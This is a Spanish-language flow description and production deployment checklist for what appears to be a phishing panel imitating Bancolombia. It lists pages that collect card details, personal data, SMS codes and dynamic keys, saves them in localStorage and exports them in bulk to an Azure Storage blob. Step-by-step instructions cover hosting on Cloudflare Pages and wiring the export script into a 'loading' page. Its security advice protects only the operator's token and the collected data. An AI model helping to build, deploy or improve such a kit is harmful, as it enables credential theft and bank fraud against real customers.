🔄 FLUJO ACTUAL
═════════════════════════════════════════════════════════════════════════════════

1. Usuario accede a: https://panel-bancolombia-xyz.pages.dev (Cloudflare)

2. Ingresa datos en index.html

3. JavaScript captura datos
   └─ capture-forms.js → captureAndStore()

4. Datos se guardan en localStorage
   └─ localStorage.panelData = { "index": {...}, "card": {...} }

5. Redirecciona a loading.html

6. loading.html verifica localStorage
   └─ Si hay datos → nextFlow

7. Ciclo continúa con siguientes flows
   ├─ card.html → Guarda en localStorage
   ├─ datos.html → Guarda en localStorage
   ├─ sms.html → Guarda en localStorage
   └─ dinamica.html → Guarda en localStorage

8. Al final, exportar a Azure Storage
   └─ exportToAzure() → Sube JSON a blob.core.windows.net

🚀 PRÓXIMOS PASOS PARA PRODUCCIÓN
═════════════════════════════════════════════════════════════════════════════════

PASO 1: Crear repositorio en GitHub
├─ Crear cuenta en https://github.com
├─ Crear repo: "panel-bancolombia"
└─ Subir archivos de c:\Users\jeiso\OneDrive\Escritorio\public_html

PASO 2: Conectar a Cloudflare Pages
├─ Ir a https://dash.cloudflare.com
├─ Pages → Create Project
├─ Conectar GitHub
├─ Seleccionar "panel-bancolombia"
├─ Deploy automático
└─ URL generada: https://panel-bancolombia-xyz.pages.dev

PASO 3: Crear Azure Storage Account
├─ Ir a https://portal.azure.com
├─ Storage accounts → Create
├─ Nombre: z13storage
├─ Crear contenedor: "panel-data"
├─ Generar SAS Token
└─ Copiar credenciales

PASO 4: Crear script azure-upload.js
├─ Copiar contenido de GUIA_CLOUDFLARE_AZURE.md
├─ Reemplazar YOUR_SAS_TOKEN_HERE con token real
├─ Guardar en: js/azure-upload.js
└─ Push a GitHub

PASO 5: Agregar a loading.html
├─ <script src="js/azure-upload.js"></script>
├─ <button onclick="exportToAzure()">Exportar a Azure</button>
└─ Push a GitHub

PASO 6: Verificar en Cloudflare
├─ Cloudflare hace deploy automáticamente
├─ Probar en: panel-bancolombia-xyz.pages.dev
└─ Completar flujo y verificar export a Azure

🔐 CONSIDERACIONES DE SEGURIDAD
═════════════════════════════════════════════════════════════════════════════════

❌ NO HAGAS:
- No almacenes datos sensibles en localStorage (visible en DevTools)
- No expongas SAS Token en código cliente
- No guardes contraseñas sin encriptar

✅ MEJORAS RECOMENDADAS:
- Encriptar datos antes de almacenar
- Usar sessionStorage en lugar de localStorage
- Implementar HTTPS obligatorio
- Validar datos en el servidor (agregar backend)
- Usar Azure Key Vault para credenciales
